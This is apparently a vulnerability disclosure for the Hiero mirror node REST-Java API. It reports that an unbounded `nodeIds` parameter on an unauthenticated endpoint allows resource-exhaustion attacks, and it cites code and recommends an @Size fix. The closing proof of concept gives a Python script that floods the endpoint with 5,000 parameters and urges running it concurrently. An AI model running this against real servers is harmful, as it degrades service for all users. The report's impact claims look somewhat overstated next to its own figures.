### Title
Unbounded `nodeIds` List in `NetworkNodeRequest` Enables DoS via Memory Exhaustion and Oversized PostgreSQL Array

### Summary
The `nodeIds` field in `NetworkNodeRequest` has no `@Size` constraint, allowing an unauthenticated attacker to submit thousands of `node.id=eq:X` query parameters. Each unique value is unconditionally added to a `HashSet<Long>` and then materialized into a `Long[]` array that is passed directly into a native PostgreSQL query, consuming heap memory and potentially overwhelming the database query planner. The analogous `RegisteredNodesRequest.registeredNodeIds` field correctly applies `@Size(max = 2)`, confirming the pattern was known but omitted here.

### Finding Description

**Root cause — missing `@Size` on `nodeIds`:**

`NetworkNodeRequest.nodeIds` is declared as an unbounded `List<NumberRangeParameter>` with no size constraint:

```java
// rest-java/src/main/java/org/hiero/mirror/restjava/dto/NetworkNodeRequest.java, line 38
private List<NumberRangeParameter> nodeIds = List.of();
``` [1](#0-0) 

Compare with `RegisteredNodesRequest`, which correctly limits its equivalent list:

```java
// rest-java/src/main/java/org/hiero/mirror/restjava/dto/RegisteredNodesRequest.java, line 43-44
@Size(max = 2)
private List<NumberRangeParameter> registeredNodeIds = List.of();
``` [2](#0-1) 

**Exploit path in `NetworkServiceImpl.getNetworkNodes`:**

Every `EQ`-operator entry is added to a `HashSet<Long>` with no cap:

```java
// NetworkServiceImpl.java lines 106-118
final Set<Long> nodeIds = new HashSet<>();
for (final var nodeIdParam : nodeIdParams) {
    if (nodeIdParam.operator() == RangeOperator.EQ) {
        nodeIds.add(nodeIdParam.value());   // unbounded accumulation
    }
    ...
}
``` [3](#0-2) 

The entire set is then streamed into a `Long[]` array and forwarded to the database:

```java
nodeIdArray = nodeIds.stream().filter(range::contains).toArray(Long[]::new);
...
return networkNodeRepository.findNetworkNodes(fileId, nodeIdArray, ...);
``` [4](#0-3) 

The native query passes this array directly into a PostgreSQL `= any(:nodeIds)` clause with no server-side cap:

```sql
where (coalesce(array_length(:nodeIds, 1), 0) = 0 or abe.node_id = any(:nodeIds))
``` [5](#0-4) 

**Why existing checks are insufficient:**

- `@Min(1)` on `limit` and `getEffectiveLimit()` cap only the *result* count, not the input parameter count.
- The `limit` cap at 25 (`MAX_LIMIT`) does nothing to restrict how many `node.id` parameters are parsed and accumulated.
- Spring Boot's embedded Tomcat defaults allow up to **10,000 query parameters** (`maxParameterCount`), meaning an attacker can legally submit ~10,000 distinct `node.id=eq:X` values in a single request. [6](#0-5) 

### Impact Explanation

Each `Long` object in the `HashSet` carries ~16 bytes of heap overhead. At Tomcat's default 10,000-parameter ceiling, a single request allocates ~160 KB of heap for the set plus the resulting array. More critically, the `Long[]` array is serialized into a PostgreSQL array literal and sent as a query parameter; a 10,000-element array in `= any(...)` forces the query planner to evaluate a large IN-list, increasing CPU and memory pressure on the database. Concurrent requests from multiple attackers (or a single attacker with parallel connections) multiply this effect, leading to heap pressure on the JVM and query-planner saturation on PostgreSQL — both resulting in service degradation or outright denial of service for all users.

### Likelihood Explanation

The endpoint (`GET /api/v1/network/nodes`) requires no authentication. Any external user can craft a request with thousands of repeated `node.id=eq:X` parameters using a trivial script or even a browser. The attack is stateless, requires no prior knowledge of the system, and is trivially repeatable. The only natural throttle is Tomcat's `maxParameterCount` (default 10,000), which is itself a large enough budget to cause measurable harm.

### Recommendation

1. **Add `@Size(max = N)` to `nodeIds`** in `NetworkNodeRequest`, mirroring the pattern already used in `RegisteredNodesRequest`. A reasonable maximum is 25 (matching `MAX_LIMIT`) or a small fixed constant (e.g., 10):

```java
@RestJavaQueryParam(name = NODE_ID, required = false)
@Builder.Default
@Size(max = 25)
private List<NumberRangeParameter> nodeIds = List.of();
```

2. **Enforce the constraint at the controller layer** by ensuring `@Validated` is applied so Jakarta Validation triggers on the DTO before `getNetworkNodes` is called.

3. **Optionally lower Tomcat's `maxParameterCount`** in `application.yml` to a value appropriate for this API's legitimate use cases.

### Proof of Concept

```bash
# Build a URL with 5000 distinct node.id=eq:X parameters (well within Tomcat's default limit)
python3 -c "
params = '&'.join(f'node.id=eq:{i}' for i in range(5000))
print(f'GET /api/v1/network/nodes?{params}')
" | head -c 200

# Send it (replace HOST with the mirror node REST-Java endpoint)
python3 -c "
import urllib.request, urllib.parse
params = '&'.join(f'node.id=eq:{i}' for i in range(5000))
url = f'http://HOST/api/v1/network/nodes?{params}'
urllib.request.urlopen(url)
"
```

Repeat this request concurrently from multiple threads to amplify heap and DB pressure. Each request forces construction of a `HashSet<Long>` with up to 5,000 entries, a `Long[]` of the same size, and a PostgreSQL query with a 5,000-element array literal — all with no server-side rejection.

### Citations

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/dto/NetworkNodeRequest.java (L36-38)
```java
    @RestJavaQueryParam(name = NODE_ID, required = false)
    @Builder.Default
    private List<NumberRangeParameter> nodeIds = List.of();
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/dto/NetworkNodeRequest.java (L40-55)
```java
    @RestJavaQueryParam(name = LIMIT, required = false)
    @Builder.Default
    @Min(1)
    private int limit = DEFAULT_LIMIT;

    @RestJavaQueryParam(name = ORDER, required = false)
    @Builder.Default
    private Direction order = Direction.ASC;

    /**
     * Gets the effective limit, capped at MAX_LIMIT. Matches rest module behavior where limit is capped at 25 for
     * network nodes.
     */
    public int getEffectiveLimit() {
        return Math.min(limit, MAX_LIMIT);
    }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/dto/RegisteredNodesRequest.java (L41-44)
```java
    @Builder.Default
    @RestJavaQueryParam(name = REGISTERED_NODE_ID, required = false)
    @Size(max = 2)
    private List<NumberRangeParameter> registeredNodeIds = List.of();
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/NetworkServiceImpl.java (L106-118)
```java
        final Set<Long> nodeIds = new HashSet<>();
        long lowerBound = 0L;
        long upperBound = Long.MAX_VALUE;

        for (final var nodeIdParam : nodeIdParams) {
            if (nodeIdParam.operator() == RangeOperator.EQ) {
                nodeIds.add(nodeIdParam.value());
            } else if (nodeIdParam.hasLowerBound()) {
                lowerBound = Math.max(lowerBound, nodeIdParam.getInclusiveValue());
            } else if (nodeIdParam.hasUpperBound()) {
                upperBound = Math.min(upperBound, nodeIdParam.getInclusiveValue());
            }
        }
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/service/NetworkServiceImpl.java (L127-136)
```java
            nodeIdArray = nodeIds.stream().filter(range::contains).toArray(Long[]::new);
            if (nodeIdArray.length == 0) {
                return List.of();
            }
        } else {
            nodeIdArray = EMPTY_NODE_ID_ARRAY;
        }

        return networkNodeRepository.findNetworkNodes(
                fileId, nodeIdArray, lowerBound, upperBound, orderDirection, limit);
```

**File:** rest-java/src/main/java/org/hiero/mirror/restjava/repository/NetworkNodeRepository.java (L96-96)
```java
            where (coalesce(array_length(:nodeIds, 1), 0) = 0 or abe.node_id = any(:nodeIds))
```
